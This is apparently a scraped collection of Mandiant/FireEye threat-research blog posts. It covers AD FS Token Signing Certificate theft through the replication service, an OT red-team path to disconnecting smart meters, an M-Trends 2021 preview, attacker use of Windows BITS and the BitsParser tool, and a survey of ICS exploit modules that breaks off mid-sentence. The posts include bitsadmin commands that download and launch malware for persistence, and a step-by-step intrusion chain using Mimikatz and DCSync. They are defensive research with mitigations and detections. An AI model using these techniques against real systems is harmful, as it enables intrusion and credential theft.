<StoreLocationValue>CurrentUser</StoreLocationValue> <X509FindTypeValue>FindByThumbprint</X509FindTypeValue> </SigningToken> Figure 2: Example Token Signing Certificate stored in the AD FS database The Token Signing Certificate as it is stored in the AD FS database is encrypted using symmetric key encryption. Windows uses a technology called Distributed Key Management (DKM) to store the secret value used to derive the symmetric key in an Active Directory container. The AD FS service account can read the attributes of this container, derive the symmetric key, and then decrypt the Token Signing Certificate. AD FS Replication AD FS also supports a farm configuration for high availability and load balancing in larger enterprise networks. The individual AD FS servers in a farm can be configured to use unique Token Signing Certificates; however, the default is to have the servers share the same Token Signing Certificate.  In order to stay in sync with each other, the farm will have a primary node and secondary nodes. The secondary nodes make use of a replication service to acquire configuration settings and certificates from the primary AD FS server. To facilitate this, AD FS makes use of Windows Communication Foundation (WCF). WCF is a framework that allows developers to build service-oriented applications . A WCF application has two components: the service that will receive and process messages, and the client that sends messages to a service and receives back responses. The AD FS servers run a WCF service that is called the Policy Store Transfer Service internally. To send a message to this service, the client will connect to the URL http://<adfs server name>:80/adfs/services/policystoretransfer . Note that even though the channel is over HTTP, the actual data being exchanged is encrypted during transit. It is also key to understand that although there is a single primary AD FS server, all nodes in an AD FS farm run this WCF service and can be used for replication. Upon receipt of a message, the WCF service enforces an authorization check to ensure the calling identity is permitted to receive the requested information. The permission check is done by evaluating an authorization policy that is also stored in the IdentityServerPolicy.ServiceStateSummary table of the AD FS database. The policy permits identities whose primary SID matches the AD FS Service account or to any identity that is member of the AD FS server’s local administrators group. If the identity of the client passes the authorization check, then the WCF service will send back a message containing the requested information. <AuthorizationPolicy> @RuleName = “Permit Service Account”exists([Type == “http://schemas.microsoft.com/ws/2008/06/identity/claims/ primarysid”, Value == “S-1-5-21-3508695881-2242692613 -376241919-1107”]) => issue(Type = “http://schemas .microsoft.com/authorization/claims/permit”, Value = “ true”); @RuleName = “Permit Local Administrators”exists([Type == “http://schemas.microsoft.com/ws/2008/06/identity/claims/group sid”, Value == “S-1-5-32-544”])=> issue(Type = &quot ;http://schemas.microsoft.com/authorization/claims/permit”, Value = “true”); </AuthorizationPolicy> Figure 3: Default Authorization Policy for AD FS server Room for Abuse A threat actor can abuse the Policy Store Transfer Service to acquire the encrypted Token Signing Certificate over the network, similar to the DCSync technique for Active Directory. It is important to note that the data is still encrypted and requires the DKM key stored in Active Directory to decrypt. This technique, however, requires a significant change to how defenders have secured AD FS servers and monitored them for theft of the Token Signing Certificate. First, previous techniques required code execution on an AD FS server to extract the data or at least an SMB connection to transfer the backing database files. With a strong defense in depth program using secure credential management, EDR, and network segmentation, an enterprise can make it very difficult for a threat actor to access an AD FS server and the Token Signing Certificate. Abusing the AD FS Replication service, however, requires only access to the AD FS server over the standard HTTP port. The default installation of AD FS will even create a Windows Firewall rule to allow HTTP traffic from any system. Additionally, a threat actor does not need the credentials for the AD FS service account and can instead use any account that is a local administrator on an AD FS server. Lastly, there is no Event Log message that is recorded when a replication event occurs on an AD FS server. Altogether, this makes the technique both much easier to execute and much harder to detect. The authorization policy itself also presents an opportunity for abuse. Because the authorization policy is stored as XML text in the configuration database, a threat actor with enough access could modify it to be more permissive. A threat actor could modify the Authorization Policy to include a group SID such as domain users, S-1-5-21-X-513 . Similarly, they could add an ACE to the DKM key container in Active Directory. This would allow the threat actor to easily obtain the Token Signing Certificate and decrypt it using any domain user credentials. This would give them persistent ability to perform a Golden SAML attack with only access to the network as a requirement. Mandiant has not yet observed this technique used in the wild; however, it is trivial to write a POC for and we are aware of one public tool that will soon support it. Figure 4 shows the output of POC code written in .NET to extract the Token Signing Certificate from a remote AD FS server. Figure 4: POC code output Mitigations The best mitigation against this technique is to use the Windows Firewall to restrict access to port 80 TCP to only the AD FS servers in the farm. If an organization has only a single AD FS server, then port 80 TCP can be blocked completely. This block can be put in place because all traffic to and from AD FS servers and proxies for user authentication is over port 443 TCP. To limit inbound communications, modify the existing firewall rule that AD FS inserts on installation. Set-NetFirewallRule -DisplayName \"AD FS HTTP Services (TCP-In)\" -RemoteAddress <ADFS1 IP address>,<ADFS2 IP Address> If no rule exists, the scriptlet in Figure 5 should be applied to all ADFS servers to create one. New-NetFirewallRule -DisplayName \"Allow ADFS Servers TCP 80\" -Direction Inbound -Action Allow  -Protocol TCP -LocalPort 80 -RemoteAddress <ADFS1 IPAddress >,<ADFS2 IPAddress> Figure 5: Windows Firewall - Allow ADFS Server - TCP 80 Organizations that are monitoring the internal network can alert on HTTP POST requests to the address that hosts the Policy Store Transfer service. If there is an AD FS farm, then the IP addresses of the AD FS servers will need to be whitelisted against the rule. Figure 6 shows a sample Snort rule to detect this activity. alert tcp any any -> any 80 (msg:\"AD FS Replication\"; flow:established, to_server; content:\"POST\"; http_method; content:\"adfs/services/policystoretransfer\"; http_uri; threshold:type limit,track by_src,count 1,seconds 3600; priority:3; sid:7000000; rev:1;) Figure 6: Sample snort rule Acknowledgements Mandiant would like to acknowledge the great work of Dr. Nestori Syynimaa (@DrAzureAD). Dr. Syynimaa independently thought to research the replication of configuration information between AD FS servers and has published his findings on his blog . Mandiant would also like to thank Microsoft for their collaboration on mitigations and detections for this technique. Lastly, special thanks to Mike Burns of the Mandiant Security Transformation services team for his feedback on mitigations and detections. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/04/hacking-operational-technology-for-defense-lessons-learned.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-04-13",
                    "source": "www.fireeye.com"
                },
                "text": "High-profile security incidents in the past decade have brought increased scrutiny to cyber security for operational technology (OT). However, there is a continued perception across critical infrastructure organizations that OT networks are isolated from public networks—such as the Internet. In Mandiant’s experience, the concept of an ‘air gap’ separating OT assets from external networks rarely holds true in practice. In 2018, we released a blog post presenting the tools and techniques that TEMP.Veles used during the TRITON incident to traverse from an external compromise of the information technology (IT) network of a critical infrastructure organization to the safety systems located deep in the OT network. We regularly reproduce this approach in our OT-focused red team engagements to expose similar attack paths across client infrastructure and to identify environment specific opportunities to prevent and detect network propagation techniques across intermediary systems. In this blog post, we share another case study from one of our OT Red Team engagements to illustrate the tactics, techniques, and procedures (TTPs) that can be leveraged by sophisticated threat actors to breach the protected perimeter between an IT network and an OT network. We also examine some of the different types of critical information often found in IT networks that an attacker can leverage during later stages of the Targeted Attack Lifecycle. The goal of this engagement was to access an endpoint meter control infrastructure for a state-wide smart grid environment from the Internet and turn it off. To hear our experts relay more on this and other OT Red Team lessons learned, join our FireEye Mandiant Virtual Summit session . Visit our website to learn more about Mandiant’s OT security practice or contact us directly to request Mandiant services or threat intelligence . Building the Foundation: Information Gathering for IT-OT Network Propagation Targeted OT attacks attempting to cause physical impacts require planning. A sophisticated actor who is motivated to disrupt or modify an industrial process from a public network will necessarily need to maintain access to the victim environment and remain undetected for enough time to accomplish their objective. Throughout this time, the actor will strive to learn about the control process to formulate the attack, figure out how to pivot to the OT systems and bypass security controls, and sometimes even develop or deploy custom OT malware. Similar to the techniques used by TEMP.Veles to reach the OT network during the TRITON incident , Mandiant’s experience during red team engagements highlights that collecting information from IT network assets plays a crucial role in targeted OT attacks. As a result, the internal reconnaissance phase for OT targeted attacks begins in the enterprise network, where the actor obtains knowledge and resources to propagate from an initial compromise in the IT network to remote access in the OT network. Detailed information collected about the target, their security operations, and their environment can also support an actor's attempts at remaining undetected while expanding operations. Figure 1: Targeted OT attack from a public network Thinking Like an Adversary: How to Turn Off Smart Energy Meters The ideal scenario for an attacker targeting OT systems is to achieve their objective while remaining undetected. Mandiant’s Red Team works with clients across critical infrastructure industries to simulate attack scenarios in which actors can accomplish this goal by gaining access to OT systems via compromise of external facing IT networks. During these engagements, we emulate real actor behaviors to learn about our target and to determine the best paths for IT/OT network propagation. For this engagement, we simulated an end-to-end OT-specific attack scenario in which we tested the security controls and response capabilities of an organization to protect smart grid meter control infrastructure from an external attacker. Mandiant leveraged weaknesses in people, process, and technology to gain remote access from the public Internet and to achieve a set of pre-approved objectives in the OT environment. Establishing a Foothold in the IT Network Mandiant conducted a spear phishing exercise to gain initial access into the client’s enterprise network from the Internet. We defined a combination of two different phishing scenarios that we deployed to test email filtering and egress monitoring controls: Embedded link for a malicious file hosted on a Mandiant owned domain on the Internet Email attachment for a Microsoft Office document with auto - executable macro code This exercise allowed our team to achieve code execution on a user workstation in the enterprise environment and to establish an unattributable egress communication path to a Mandiant hosted Cobalt Strike Command and Control (C&C) server on the Internet. After establishing a stable communication path with workstations in the enterprise environment, we utilized the following publicly available offensive security tools (OST) to escalate privileges and to obtain domain administrator level access: ldapsearch to enumerate information in the enterprise domain PowerSploit to exploit common security misconfigurations in IT WMImplant to move laterally from one system to another in the internal network Mimikatz to extract credentials for local user and domain administrator accounts As domain administrators, we gained unrestricted access to a variety of resources connected to the enterprise domain (e.g. server resources, file shares, IT applications, and administrator consoles for IT systems). During the initial stages of our engagement, our actions were in no way different to other less sophisticated intrusions on industrial organizations, such as financially-motivated compromises. Defining Our Path to the OT Network Similar to real world threat actors carrying out targeted OT attacks, Mandiant’s OT Red Team dedicates significant effort for internal reconnaissance in the IT network to develop a logical mapping of the extended network architecture and discover targets of interest (people, processes, or technology). The information we acquire helps us to (a) define paths to propagate from the IT to the OT network and (b) achieve our final objective in the OT network without raising alarms. During OT Red Team engagements across different industries, we follow a real attacker’s cost-benefit analysis to determine which sources or methods are most likely to help us obtain that information. Figure 2: Information sources and target information from enterprise networks For this engagement, we leveraged the domain administrator credentials obtained in the previous phase to gain access to Microsoft System Center Configuration Manager (SCCM) in the IT network. Logged into the SCCM console, we leveraged software deployment features for collection to establish C&C over user workstations belonging to pre-selected departments in the client organization. Mandiant chose the specific groups based on the names of their departments and the description attributes, which suggested a high likelihood of member users with high privilege access for network infrastructure or application management. This included members of the following groups: network management, firewall administration, control engineering, and smart meter operations. Access to user workstations of target employees in these departments enabled us to: Capture keystrokes to obtain remote desktop protocol (RDP) credentials for the OT network by using a Cobalt Strike modified script Login to department file shares and extract OT system design documents Extract network design documents and backup files for OT firewall configurations found in the firewall management console Find plaintext credentials for OT management systems from operation manuals Internal reconnaissance in the IT network not only allowed us to obtain remote access credentials for the OT network, but to also gain a deeper understanding of the business processes and technical control system operations in the OT environment by reviewing internal OT-specific operational procedures and security documentation such as asset inventories and configurations. Propagating to the OT Network During the process of propagation from IT to OT networks, an actor will leverage previously compromised systems, credentials, or applications to access systems in higher security zones—such as OT demilitarized zones (DMZ). Based on our observations during multiple red teaming engagements and research, the most likely attack vectors for propagation are: Table 1: Most likely attack vectors for IT/OT propagation For this engagement, we initially analyzed the system architecture to define the best path to follow. Engineers from the target organization were required to use multi-factor-authentication (MFA) to gain remote access to jumpbox servers in the OT network. While not impossible, bypassing this setup would require more time and resources. We instead decided to search for other plausible attack propagation paths. Figure 3: Formal communication path from enterprise to OT network Reviewing the firewall configuration files, we identified a dedicated communication path for management access to a Microsoft Windows patch management server in a DMZ between the IT network and the OT network. This patch management server was running on a virtual machine in the DMZ network, while the administration console for the underlying hypervisor software itself was hosted in the IT network. Mandiant logged into the administration console for the hypervisor software using IT network domain administrator credentials. We then leveraged guest machine administration features via direct console access to execute commands on the patch management server in the DMZ network. The compromise of the patch management server in the DMZ allowed us to pivot via SMB connections to Microsoft Windows-based intermediary systems in the OT network. Figure 4: Remote attack propagation path from IT network to OT network Lastly, we compromised Microsoft Windows server systems in the OT network to complete the objectives of the exercise. Using OT credentials retrieved in the previous phases, we authenticated to the SMB service (using single factor authentication) by pivoting through the patch management server in the DMZ network. This enabled us to execute remote console commands on management servers (such as the domain controller) in the OT network. With access to the domain controller in the core OT network, we extracted credentials for high privilege domain administrator accounts in the OT network using DCSYNC and Mimikatz. Using these accounts, we gained control of management servers, application servers, and operator workstations in the OT network. Mandiant was also able to use compromised credentials to login to the human machine interface (HMI) portal for the meter control infrastructure and issue a disconnect command for a target endpoint meter in the smart grid environment. Strategic Collection and Detection Opportunities During Reconnaissance and Network Propagation Although specific capabilities such as malware and tooling vary amongst incidents, internal reconnaissance and network propagation are consistently needed for sophisticated adversaries to expand remote operations from external networks to OT systems. Focusing collection, detection, and hunting efforts on assets or information that are likely to be compromised during these phases presents defenders with strategic opportunities to hunt for and detect targeted adversary activity before it poses a risk to control systems. In a previous blog post stating our approach to OT security, we highlighted that IT networks close to production networks and OT intermediary systems remain the best zones to detect OT targeted attacks, a.k.a. “ The Funnel of Opportunity ”. As actors pivot across systems and networks to gather information and elevate privileges, they leave footprints that can be tracked before they propagate to critical systems. An actor who covertly performs internal reconnaissance and propagates to the OT network is already positioned to cause damage on mission critical assets and is unlikely to be discovered. Early detection of adversary activity before reaching critical OT systems will decrease the dwell time and the risk of an incident. OT defenders can prioritize collection and detection, alert triage, and incident response efforts by becoming familiar with the types of information and services that OT focused threat actors commonly search for during internal reconnaissance in IT networks and network propagation across OT intermediary systems. Understanding where this information resides presents defenders with a catalog of systems and networks to focus collection and detection efforts on. Defenders can create tailored detections to hunt for adversary activity pursuing this information, prioritize alert response efforts, and identify additional security controls to implement. Mandiant red teaming in OT can help organizations identify which data is valuable for attackers to support their network propagation efforts and which systems are most likely to be compromised by attackers targeting OT networks. Visit our website for more information or to request Mandiant services or threat intelligence . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/04/m-trends-2021-a-view-from-the-front-lines.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-04-13",
                    "source": "www.fireeye.com"
                },
                "text": "We are thrilled to launch M-Trends 2021 , the 12 th edition of our annual FireEye Mandiant publication. The past year has been unique, as we witnessed an unprecedented combination of global events. Business operations shifted in response to the worldwide pandemic and threat actors continued to escalate the sophistication and aggressiveness of their attacks, while in parallel leveraged unexpected global events to their advantage. We discuss all of this and much more in the full report, which is available for download today . But first, here is a sneak preview of the most popular M-Trends metric where we answer the critical question: Are organizations getting better at detecting attacks? In short, yes! Back in 2011, we reported a 416-day global median dwell time, indicating that attackers were operating undetected on a system or network for over a year on average. This time, from Oct. 1, 2019 through Sept. 30, 2020, the median dwell time has decreased to only 24 days. This means—for the first time in M-Trends history—the median dwell time has dropped to under one month. Although this drop in dwell time is promising, it is critical for organizations to remember that cyber adversaries typically only need a few days to achieve their objective, such as identifying and stealing the crown jewels of a victim organization or launching a crippling ransomware attack. Organizations across the globe must remain vigilant, to prepare for the next incident. There is much more to unpack in the M-Trends 2021 report. Here is a quick rundown of what to expect: By the Numbers : A large and diverse set of metrics including attacker dwell time, detection by source, industry targeting, growing threat techniques, sophisticated malware families, and more. Ransomware : Front-line stories on how this harmful threat is evolving, challenges with recovery, and best practice hardening strategies to effectively combat this threat. Newly Named Threat Groups : More on FIN11, a financially motivated threat group that we promoted in 2020, which has been active since at least 2016 and is most recently known for operations involving ransomware and extortion. Pandemic-Related Threats : Breakdown of countless espionage campaigns targeting ground-breaking research in the race to learn more about COVID-19. UNC2452/SUNBURST : UNC2452’s headline-making compromise of environments via an implant in the SolarWinds Orion platform, mapped to the attack lifecycle framework with details at every stage. Case Studies : Mandiant engagements involving the rise of insider threats and how to be more prepared, plus advanced red teaming tactics that enabled access to executive emails without any exploits. For over a decade, the mission of M-Trends has always been the same: to arm security professionals with insights on the latest attacker activity as seen directly on the front lines, backed by actionable learnings to improve organizations’ security postures within an evolving threat landscape. Download the M-Trends 2021 report today, and then for more information, check out the FireEye Mandiant Virtual Summit . Starting today and running through April 15, the event includes a variety of sessions, with three related to M-Trends : one that provides an overview of the report and highlights key topics , another focused on our “By the Numbers” chapter coupled with mitigation solutions related to these metrics, and one covering the report through a lens from the EMEA region . Register now ! Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/03/attacker-use-of-windows-background-intelligent-transfer-service.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-03-31",
                    "source": "www.fireeye.com"
                },
                "text": "In this blog post we will describe: How attackers use the Background Intelligent Transfer Service (BITS) Forensic techniques for detecting attacker activity with data format specifications Public release of the BitsParser tool A real-world example of malware using BITS persistence Introduction Microsoft introduced the Background Intelligent Transfer Service (BITS) with Windows XP to simplify and coordinate downloading and uploading large files. Applications and system components, most notably Windows Update, use BITS to deliver operating system and application updates so they can be downloaded with minimal user disruption. Applications interact with the Background Intelligent Transfer Service by creating jobs with one or more files to download or upload. The BITS service runs in a service host process and can schedule transfers to occur at any time. Job, file, and state information is stored in a local database. How Attackers Use BITS As is the case with many technologies, BITS can be used both by legitimate applications and by attackers. When malicious applications create BITS jobs, files are downloaded or uploaded in the context of the service host process. This can be useful for evading firewalls that may block malicious or unknown processes, and it helps to obscure which application requested the transfer. BITS transfers can also be scheduled allowing them to occur at specific times without relying on long-running processes or the task scheduler. BITS transfers are asynchronous, which can result in situations where the application that created a job may not be running when the requested transfers complete. To address this scenario BITS jobs can be created with a user-specified notification command, which will be executed after the job completes or in case of errors. The notification commands associated with BITS jobs can specify any executable or command to run. Attackers have utilized this feature as a method for maintaining persistence of malicious applications. Since the command data for BITS jobs is stored to a database rather than traditional registry locations, it can be overlooked by tools that attempt to identify persistence executables and commands or by forensic investigators. BITS jobs can be created using API function calls or via the bitsadmin command line tool. See Figure 1 and Figure 2 for an example of how a BITS job can be used to download a file and trigger execution. > bitsadmin /create download > bitsadmin /addfile download https://<site>/malware.exe c:\\windows\\malware.exe > bitsadmin /resume download > bitsadmin /complete download Created job {EA8603EB-7CC2-44EC-B1EE-E9923290C2ED}. Added https://<site>/malware.exe -> c:\\windows\\malware.exe to job. Job resumed. Job completed. Figure 1: Using bitsadmin to create a job that downloads a malicious executable and stores it to c:\\windows\\malware.exe. > bitsadmin /create persistence > bitsadmin /addfile persistence http://127.0.0.1/invalid.exe c:\\windows\\i.exe > bitsadmin /SetNotifyCmdLine persistence c:\\windows\\malware.exe NULL > bitsadmin /resume persistence Figure 2: Using bitsadmin to create a job that will launch malware.exe after attempting to download an invalid URL. Creating BitsParser Through our investigations, Mandiant consultants identified evidence of attackers leveraging BITS across multiple campaigns. In order to search for evidence of attacker use of BITS, we needed to understand the underlying infrastructure used by BITS and create a tool that could collect relevant information. We created BitsParser , which parses BITS databases and returns information about jobs executed on endpoint systems. The tool can be run internally by Mandiant consultants via our endpoint agent allowing BITS data to be acquired from many hosts across an enterprise. BitsParser has been successfully used in many investigations to uncover attacker downloads, uploads, and persistence. In order to process the custom database format, BitsParser utilizes the open source ANSSI-FR library. The library allows parsing of both active and deleted entries from BITS database files, and it can fully extract relevant information from job and file records. The QMGR Database BITS jobs and associated state information are stored in local “queue manager” (QMGR) database files in the %ALLUSERSPROFILE%\\Microsoft\\Network\\Downloader directory. The database is stored to files named qmgr0.dat and qmgr1.dat. The two-file scheme appears to be used for back up and synchronization purposes. The second file largely contains duplicate job and file information, though some unique or older entries can be found in the file. Windows 10 Changes The Background Intelligent Transfer Service has largely remained unchanged since its introduction. However, Windows 10 introduced significant changes to the service, including an all new database format. On Windows 10 the QMGR database is stored using the Extensible Storage Engine (ESE) format. ESE databases have been used in many other Microsoft products including Exchange, Active Directory, and Internet Explorer. Windows 10 stores the QMGR database in a single file called qmgr.db . Separate transaction log files are maintained in the same directory. The most recent transaction log is stored to a file called edb.log , and three older transaction logs with numerical suffixes are typically present. Parsing ESE Databases In order to support investigations on Windows 10 systems, we updated the BitsParser tool to support the new QMGR database format. To accomplish this, we needed a Python-based ESE database parser. Research led us to libesedb , which is a full ESE database implementation written in C with a Python wrapper. With no other Python options available, we initially used libesedb in BitsParser to parse the Windows 10 QMGR database. However, we sought a solution that did not rely on native executables and would be more compact for improved efficiency in large scale deployments. The only pure Python ESE database implementation we identified was part of the Impacket network toolset. Although the source code could perform basic database enumeration, it lacked key features, including the ability to process long values. Since the QMGR database includes entries large enough to require long values, modification of the Impacket implementation was required. We adapted the Impacket ESE database parsing code to make it more robust and support all features necessary for parsing QMGR databases. The full Python solution allows database parsing in a much smaller package without the risks and limitations of native code. Database Structure The Windows 10 QMGR database contains two tables: Jobs and Files. Both tables have two columns: Id and Blob. The Id contains a GUID to identify the entry, and the Blob contains binary data which defines the job or file. Fortunately, the job and file structures are largely unchanged from the previous database format. Job data starts with the control structure: Offset Field Size 0 Type 4 4 Priority 4 8 State 4 ... 16 Job ID (GUID) 16 32 Name (UTF-16) variable variable Description (UTF-16) variable variable Command (UTF-16) variable variable Arguments (UTF-16) variable variable User SID (UTF-16) variable variable Flags 4 Following the control structure is a list of files delimited by the XFER GUID, {7756DA36-516F-435A-ACAC-44A248FFF34D}. The list begins with a 4-byte file count followed by a list of GUIDs, which correspond to Id values in the Files table. The file data uses the following structure: Field Size Destination Filename (UTF-16) variable Source Filename (UTF-16) variable Temporary Filename (UTF-16) variable Download Size 8 Transfer Size 8 unknown 1 Drive (UTF-16) variable Volume GUID (UTF-16) variable The database is processed by enumerating entries in the Jobs table, parsing each job data, finding correlated files, and parsing the corresponding records in the Files table. This allows the BitsParser to combine related information and output jobs with their associated files including relevant metadata. Recovering Deleted Records Active jobs have entries in the Jobs and Files tables. Records are deleted upon job completion or cancellation. As with other filesystem and data formats, deleted entries are not immediately overwritten and can often be recovered for some time after deletion. The following algorithm is used to recover deleted jobs and files from Windows 10 QMGR databases: Locate file records by searching for the file identifier GUID, {519ECFE4-D946-4397-B73E-268513051AB2}. Attempt to parse the following data as a normal file record. Locate job records by searching for job identifier GUIDs. Attempt to parse the following data as a normal job record. Handle incomplete job entries by parsing just the control structure and manually locate associated files if required. The following job GUIDs have been observed in QMGR databases: {E10956A1-AF43-42C9-92E6-6F9856EBA7F6} {4CD4959F-7064-4BF2-84D7-476A7E62699F} {A92619F1-0332-4CBF-9427-898818958831} {DDBC33C1-5AFB-4DAF-B8A1-2268B39D01AD} {8F5657D0-012C-4E3E-AD2C-F4A5D7656FAF} {94416750-0357-461D-A4CC-5DD9990706E4} Correlate carved file records to carved jobs. Process all remaining carved file records that could not be correlated to active or deleted jobs. Historic records can also be found in transaction log files. Although we do not parse the transaction log structures, the same algorithm can be used to find job and file records within the logs by searching for appropriate GUIDs. While the same records may be present in multiple files, duplicates can be suppressed to prevent output of redundant information. BitsParser Tool Release At the time of writing we are not aware of any open source tools available to parse BITS databases and extract data useful for incident response and forensic investigations. To help address this and foster further research, FireEye has decided to release a standalone version of BitsParser. This command line utility can process all versions of BITS databases and perform carving to recover deleted job and file information. Source code for BitsParser can be found at our GitHub page . Note that on Windows 10 the QMGR database files are opened without sharing by the BITS service thus preventing other programs from directly opening them. When BitsParser is deployed via the FireEye endpoint agent it can directly parse the local filesystem and raw read files in circumstances where they cannot be directly read. The standalone BitsParser does not have this ability. The BITS service should be stopped prior to running BitsParser or third-party tools for copying locked files may be utilized. BITS Persistence in the Wild In 2020 Mandiant responded to many incidents involving Ryuk ransomware operators leveraging custom backdoors and loaders to actively target hospitals and other medical support centers (see our blog post Unhappy Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chaser ). Through numerous engagements Mandiant was able to profile the attacker's Tools Techniques and Procedures (TTPs) and identify unique aspects of the various backdoors and loaders that were leveraged prior to encryption. In one such engagement, Mandiant consultants had mapped the vast majority of the attack timeline from initial exploitation to the encryption of corporate resources and an extortion demand. Log analysis and telemetry provided by the customer's on-premises endpoint detection solution led to the identification of a KEGTAP backdoor on an end-user workstation. Mandiant was able to identify the specific email and lure used by the ransomware operators including the download and execution of the file mail.exe , which launched KEGTAP. However, none of the persistence mechanisms that Mandiant observed in other engagements were present on this endpoint. A full understanding of the persistence mechanism would allow Mandiant to hunt for additional evidence of attacker activity across the environment and in other engagements. As focus intensified, Mandiant consultants identified evidence to indicate that the BITS service launched the KEGTAP backdoor. Analysts identified entries in the Microsoft-Windows-Bits-Client operational event log which associated the BITS service activity with the file mail.exe . 3 | Information | The BITS service created a new job: System update, with owner REDACTED 61 | Warning | BITS stopped transferring the System update transfer job that is associated with the http://127.0.0.1/tst/56/ URL. The status code is 2147954429. 64 | Warning | The BITS job System update is configured to launch C:\\Users\\REDACTED\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\REDACTED\\mail.exe after transfer of http://127.0.0.1/tst/12/. The service failed to launch the program with error 2147942402, BITS will continue trying to launch the program periodically until it succeeds. Figure 3: Event log entries showing the creation of a BITS job for persistence Mandiant consultants were able to confirm the details of the BITS job by interacting with the host and examining the QMGR database. The malicious BITS job was set to attempt an HTTP transfer of a nonexistent file from the local host. As this file would never exist, BITS would trigger the error state and launch the notify command, which in this case was KEGTAP. Unfortunately, while this was successful in identifying a previously unknown persistence mechanism associated with this threat group, manual QMGR database analysis would not scale across multiple systems or environments. Adapting the existing BitsParser to parse the Windows 10 version of the QMGR database enabled Mandiant consultants to efficiently identify additional infected systems across multiple environments. { \"JobType\": \"download\", \"JobPriority\": \"normal\", \"JobState\": \"queued\", \"JobName\": \"System update\", \"CommandExecuted\": \"C:\\\\Users\\\\REDACTED\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\IE\\\\REDACTED\\\\mail.exe\", \"Files\": [ { \"DestFile\": \"C:\\\\Users\\\\REDACTED\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\IE\\\\REDACTED\\\\mail.exe\", \"SourceURL\": \"http://127.0.0.1/tst/56/\", \"DownloadByteSize\": 0 } ] } Figure 4: BitsParser output shows the malicious BITS job launching mail.exe Conclusion The Background Intelligent Transfer Service continues to provide utility to applications and attackers alike. The BITS QMGR database can present a useful source of data in an investigation or hunting operation. BitsParser may be utilized with other forensic tools to develop a detailed view of attacker activity. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/03/monitoring-ics-cyber-operation-tools-and-software-exploit-modules.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-03-23",
                    "source": "www.fireeye.com"
                },
                "text": "There has only been a small number of broadly documented cyber attacks targeting operational technologies (OT) / industrial control systems (ICS) over the last decade. While fewer attacks is clearly a good thing, the lack of an adequate sample size to determine risk thresholds can make it difficult for defenders to understand the threat environment, prioritize security efforts, and justify resource allocation. To address this problem, FireEye Mandiant Threat Intelligence produces a range of reports for subscription customers that focus on different indicators to predict future threats. Insights from activity on dark web forums, anecdotes from the field, ICS vulnerability research, and proof of concept research makes it possible to illustrate the threat landscape even with limited incident data. This blog post focuses on one of those source sets—ICS-oriented intrusion and attack tools, which will be referred to together in this post as cyber operation tools. ICS-oriented cyber operation tools refer to hardware and software that has the capability to either exploit weaknesses in ICS, or interact with the equipment in such a way that could be utilized by threat actors to support intrusions or attacks. For this blog post, we separated exploit modules that are developed to run on top of frameworks such as Metasploit , Core Impact , or Immunity Canvas from other cyber operation tools due to their exceedingly high number. Cyber Operation Tools Reduce the Level of Specialized Knowledge Attackers Need to Target ICS As ICS are a distinct sub-domain to information and computer technology, successful intrusions and attacks against these systems often requires specialized knowledge, establishing a higher threshold for successful attacks. Since intrusion and attack tools are often developed by someone who already has the expertise, these tools can help threat actors bypass the need for gaining some of this expertise themselves, or it can help them gain the requisite knowledge more quickly. Alternatively, experienced actors may resort to using known tools and exploits to conceal their identity or maximize their budget. Figure 1: ICS attacker knowledge curve The development and subsequent adoption of standardized cyber operation tools is a general indication of increasing adversarial capability. Whether these tools were developed by researchers as proof-of-concept or utilized during past incidents, access to them lowers the barrier for a variety of actors to learn and develop future skills or custom attack frameworks. Following this premise, equipment that is vulnerable to exploits using known cyber operation tools becomes low-hanging fruit for all sorts of attackers. ICS Cyber Operation Tool Classification Mandiant Intelligence tracks a large number of publicly available ICS-specific cyber operation tools. The term \"ICS-specific,\" as we employ it, does not have a hard-edged definition. While the vast majority of cyber operation tools we track are clear-cut cases, we have, in some instances, considered the intent of the tool's creator(s) and the tool's reasonably foreseeable impact on ICS software and equipment. Note, we excluded tools that are IT-based but may affect OT systems, such as commodity malware or known network utilities.  We included only a few exceptions, where we identified specialized adaptations or features that enabled the tool to interact with ICS, such as the case of nmap scripts. We assigned each tool to at least one of eight different categories or classes, based on functionality. Table 1: Classes of ICS-specific intrusion and attack tools While some of the tools included in our list were created as early as 2004, most of the development has taken place during the last 10 years. The majority of the tools are also vendor agnostic, or developed to target products from some of the largest ICS original equipment manufacturers (OEM). Siemens stands out in this area, with 60 percent of the vendor-specific tools potentially targeting its products. Other tools we identified were developed to target products from Schneider Electric, GE, ABB, Digi International, Rockwell Automation, and Wind River Systems. Figure 2 depicts the number of tools by class. Of note, network discovery tools make up more than a quarter of the tools. We also highlight that in some cases, the software exploitation tools we track host extended repositories of modules to target specific products or vulnerabilities. Figure 2: ICS-specific intrusion and attack tools by class Software Exploit Modules Software exploit modules are the most numerous subcomponents of cyber operation tools given their overall simplicity and accessibility. Most frequently, exploit modules are developed to take advantage of a specific vulnerability and automate the exploitation process. The module is then added to an exploit framework. The framework works as a repository that may contain hundreds of modules for targeting a wide variety of vulnerabilities, networks, and devices. The most popular frameworks include Metasploit , Core Impact , and Immunity Canvas . Also, since 2017, we have identified the development of younger ICS-specific exploit frameworks such as Autosploit , Industrial Exploitation Framework (ICSSPLOIT), and the Industrial Security Exploitation Framework . Given the simplicity and accessibility of exploit modules, they are attractive to actors with a variety of skill levels. Even less sophisticated actors may take advantage of an exploit module without completely understanding how a vulnerability works or knowing each of the commands required to exploit it. We note that, although most of the exploit modules we track were likely developed for research and penetration testing, they could also be utilized throughout the attack lifecycle. Exploit Modules Statistics Since 2010, Mandiant Intelligence has tracked exploit modules for the three major exploitation frameworks: Metasploit , Core Impact , and Immunity Canvas . We currently track hundreds of ICS-specific exploit modules related to more than 500 total vulnerabilities, 71 percent of them being potential zero-days. The break down is depicted in Figure 3. Immunity Canvas currently has the most exploits due in 